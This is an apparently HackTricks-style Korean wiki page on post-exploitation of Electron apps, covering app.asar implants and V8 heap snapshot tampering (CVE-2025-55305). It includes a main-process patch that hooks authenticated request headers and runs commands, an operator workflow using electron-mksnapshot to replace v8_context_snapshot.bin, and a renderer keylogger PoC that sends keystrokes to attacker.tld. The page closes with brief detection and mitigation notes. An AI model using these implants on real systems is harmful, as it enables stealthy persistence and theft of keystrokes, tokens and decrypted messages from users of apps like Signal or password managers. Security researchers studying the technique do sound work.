# Electron 로컬 코드 인젝션 및 스냅샷 변조

{{#include ../../banners/hacktricks-training.md}}

## Electron 로컬 코드 인젝션

로컬에 설치된 Electron 애플리케이션을 수정하거나 계측할 수 있다면, 임의의 JavaScript를 실행하게 만들 수 있습니다. 다음을 참조하세요:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

로컬 Node inspector 또는 Chromium DevTools 디버깅 표면은 [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)를 참조하세요.

## Post-exploitation: ASAR/main-process 임플란트

Electron 앱의 리소스 디렉터리에 **쓰기 권한**을 얻었다면, 매우 실용적인 post-exploitation 기법은 **`app.asar`**(또는 앱에서 로드하는 JS 진입점)를 **패치**하고 사용자가 앱을 다시 실행할 때까지 기다리는 것입니다. renderer에서만 실행되는 XSS와 달리, **main process**에서 로드된 코드는 앱의 **Node.js 런타임**에서 실행되므로 일반적으로 **파일 시스템**에 접근하고, 명령을 실행하며, Electron API를 후킹하고, 인증된 애플리케이션 상태를 확인할 수 있습니다.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

일반적인 작업 흐름:

1. `app.asar`를 추출하고 `package.json`의 `main` 항목이나 기존 시작 로직에서 실제 부트스트랩 파일을 찾습니다.
2. **main process**에 작은 로더(또는 preload/main-process 후킹)를 추가한 뒤 아카이브를 다시 패키징합니다.
3. 애플리케이션이 다시 시작될 때까지 기다린 다음, 사용자가 데스크톱 앱을 잠금 해제하거나 인증한 후 임플란트를 사용해 런타임 데이터를 캡처합니다.

최소 부트스트랩 패치 예시:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

실질적인 영향:

- **신뢰된 클라이언트의 데이터 탈취**: 데스크톱 앱이 사용자를 위해 데이터를 복호화하거나 로드하면, implant는 런타임에서 해당 데이터를 읽을 수 있습니다. 따라서 **E2EE messaging clients**(Signal/Slack/Mattermost)와 **vault/secret managers**는 엔드포인트 계층에서 여전히 흥미로운 표적입니다.
- **세션/token 악용**: Electron implant는 실행 중인 클라이언트에 노출된 앱 쿠키, bearer token, request header, workspace 파일 또는 repo credential을 탈취할 수 있습니다(예: 인증된 VS Code extension 또는 Git integration).
- **피해자 컨텍스트를 이용한 피벗**: 패치된 앱은 피해자의 IP, TLS fingerprint, 애플리케이션 세션을 재사용해 피해자의 워크스테이션을 통해 요청을 proxy할 수 있습니다. 원시 token만 유출하는 것과는 다릅니다.

> [!NOTE]
> 대상에서 **ASAR integrity** / **OnlyLoadAppFromAsar** 또는 강화된 Electron **fuses**를 활성화한 경우, 다른 로컬 코드 로딩 primitive가 필요할 수 있습니다(예: fuse 악용 또는 snapshot tampering). 더 많은 로컬 implant 옵션과 fuse 세부 정보는 macOS 전용 injection 페이지를 참조하세요.

## V8 heap snapshot tampering을 통한 로컬 backdoor 설치 (Electron/Chromium) – CVE-2025-55305

Electron 및 Chromium 기반 앱은 시작 시 사전 빌드된 V8 heap snapshot(v8_context_snapshot.bin 및 선택적으로 browser_v8_context_snapshot.bin)을 역직렬화하여 각 V8 isolate(main, preload, renderer)를 초기화합니다. 과거에는 Electron의 integrity fuse가 이러한 snapshot을 실행 가능한 콘텐츠로 취급하지 않아 fuse 기반 integrity enforcement와 OS code-signing 검사 모두를 우회했습니다. 그 결과, 사용자가 쓰기 가능한 설치 경로에서 snapshot을 교체하면 서명된 바이너리나 ASAR를 수정하지 않고도 앱 내부에서 은밀하고 지속적인 코드 실행이 가능했습니다.<sup>[[2]](#references)</sup>

주요 사항
- Integrity 공백: EnableEmbeddedAsarIntegrityValidation 및 OnlyLoadAppFromAsar는 ASAR 내부의 앱 JavaScript를 검증하지만 V8 heap snapshot은 검증하지 않았습니다(CVE-2025-55305). Chromium도 마찬가지로 snapshot의 integrity를 확인하지 않습니다.<sup>[[3]](#references)[[4]](#references)</sup>
- 공격 전제 조건: 앱 설치 디렉터리에 로컬 파일 쓰기 권한이 있어야 합니다. Electron 앱이나 Chromium browser가 사용자가 쓰기 가능한 경로(예: Windows의 %AppData%\Local, macOS의 경우 제한 사항이 있는 /Applications)에 설치된 시스템에서 흔히 충족됩니다.
- 영향: 자주 사용되는 builtin(“gadget”)을 덮어써 모든 isolate에서 공격자의 JavaScript를 안정적으로 실행할 수 있으며, persistence를 확보하고 code-signing 검증을 회피할 수 있습니다.
- 영향 범위: fuses가 활성화된 Electron 앱과 사용자가 쓰기 가능한 위치에서 snapshot을 로드하는 Chromium 기반 browser.

Chromium 빌드 없이 악성 snapshot 생성하기
- 사전 빌드된 electron/mksnapshot을 사용해 payload JS를 snapshot으로 컴파일한 다음, 애플리케이션의 v8_context_snapshot.bin을 덮어씁니다.<sup>[[5]](#references)[[6]](#references)</sup>

최소 payload 예시(충돌을 강제로 발생시켜 실행 여부 확인)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Isolate-aware payload routing (main과 renderer에서 서로 다른 코드 실행)
- Main process 탐지: process.pid, process.binding(), process.dlopen 같은 Node 전용 전역 변수는 main process isolate에 존재합니다.
- Browser/renderer 탐지: alert 같은 브라우저 전용 전역 변수는 document 컨텍스트에서 실행할 때 사용할 수 있습니다.

main-process Node 기능을 한 번 탐지하는 예제 gadget
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

렌더러/브라우저 컨텍스트 데이터 탈취 PoC(예: Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

운영자 워크플로
1) 일반적인 builtin(예: Array.isArray)을 덮어쓰고, 선택적으로 isolate별로 분기하는 payload.js를 작성합니다.
2) Chromium 소스 없이 snapshot을 빌드합니다:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) 대상 애플리케이션의 snapshot 파일을 덮어씁니다:
   - v8_context_snapshot.bin (항상 사용됨)
   - browser_v8_context_snapshot.bin (LoadBrowserProcessSpecificV8Snapshot fuse가 사용되는 경우)
4) 애플리케이션을 실행합니다. 선택한 builtin이 사용될 때마다 gadget이 실행됩니다.

참고 사항 및 고려 사항
- 무결성/서명 우회: Snapshot 파일은 코드 서명 검사에서 네이티브 실행 파일로 취급되지 않으며, 과거에는 Electron의 fuse나 Chromium 무결성 제어 대상에도 포함되지 않았습니다.
- 지속성: 사용자 쓰기 가능 설치 위치에서 snapshot을 교체하면 일반적으로 앱을 재시작한 후에도 유지되며, 서명된 정상 앱처럼 보입니다.
- Chromium 브라우저: 사용자 쓰기 가능 위치에 설치된 Chrome 및 파생 브라우저에도 같은 변조 방식이 적용됩니다. Chrome에는 다른 무결성 완화 기능이 있지만, 물리적으로 로컬에서 수행되는 공격은 위협 모델에서 명시적으로 제외합니다.<sup>[[9]](#references)[[10]](#references)</sup>

탐지 및 완화
- Snapshot을 실행 가능한 콘텐츠로 취급하고 무결성 적용 대상에 포함합니다(CVE-2025-55305 수정 사항).
- 관리자만 쓸 수 있는 설치 위치를 우선 사용하고, v8_context_snapshot.bin 및 browser_v8_context_snapshot.bin의 해시를 기준선으로 설정하고 모니터링합니다.
- 초기 런타임의 builtin 덮어쓰기 및 예상치 못한 snapshot 변경을 탐지합니다. 역직렬화된 snapshot이 예상 값과 일치하지 않으면 경고를 발생시킵니다.

## References

- [1] [JS-Tap v3: JavaScript 임플란트를 이용한 엔드포인트 Post-Exploitation](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [코드 무결성 검사를 우회해 Signal, 1Password, Slack 등을 로컬에서 백도어하는 방법](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Electron ASAR 무결성](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [V8 사용자 지정 startup snapshot](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: 서명되지 않은 코드 로드 비활성화(CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [Chrome 보안 FAQ: 물리적으로 로컬에서 수행되는 공격은 범위 밖](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
